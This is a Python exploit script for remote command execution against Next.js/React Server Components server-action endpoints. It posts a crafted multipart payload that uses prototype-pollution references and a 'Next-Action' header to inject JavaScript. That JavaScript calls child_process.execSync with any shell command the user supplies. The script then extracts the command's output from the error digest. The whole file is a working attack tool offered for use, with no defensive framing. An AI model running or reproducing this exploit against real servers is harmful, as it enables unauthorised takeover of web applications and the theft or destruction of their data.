import requests
import sys
import json
import re

if len(sys.argv) < 3:
    print(f"Usage: python3 {sys.argv[0]} <url> <command>")
    print(f"   or: python3 {sys.argv[0]} <url> ping <ip>")
    sys.exit(1)

BASE_URL = sys.argv[1]
CMD = sys.argv[2]

if CMD.lower() == "ping" and len(sys.argv) > 3:
    CMD = f"ping -c 4 -W 2 {sys.argv[3]} 2>&1"

print(f"[+] Targeting → {BASE_URL}")
print(f"[+] Command → {CMD}\n")

SHELL_CMD = f"/bin/sh -c \"{CMD}\" 2>&1"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"""var res = process.mainModule.require('child_process')
    .execSync(`{SHELL_CMD}`, {{'timeout': 25000, 'encoding': 'utf8'}})
    .toString().trim();
throw Object.assign(new Error('NEXT_REDIRECT'), {{digest: res }});""",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}

res = requests.post(BASE_URL, files=files, headers=headers, timeout=30)

print(f"[+] HTTP Status: {res.status_code}")

# === Aggressive output extraction ===
output = None
raw = res.text

# Multiple extraction methods
patterns = [
    r'digest["\']?\s*:\s*["\']?([^"\']+?)["\']?',           # Standard
    r'E\{.*?"digest":\s*"([^"]+)"',                         # Serialized E{...}
    r'"digest":\s*"((?:[^"\\]|\\.)+)"',                     # JSON escaped
]

for pattern in patterns:
    match = re.search(pattern, raw, re.DOTALL | re.IGNORECASE)
    if match:
        output = match.group(1)
        break

if output:
    # Clean the output
    output = output.replace('\\n', '\n').replace('\\r', '\n').replace('\\"', '"').strip()
    
    print("\n" + "="*85)
    print("✅ COMMAND OUTPUT")
    print("="*85)
    print(output)
    print("="*85)
else:
    print("[-] Could not extract digest. Showing raw response:")
    print("-" * 60)
    print(raw[:1500])
    print("-" * 60)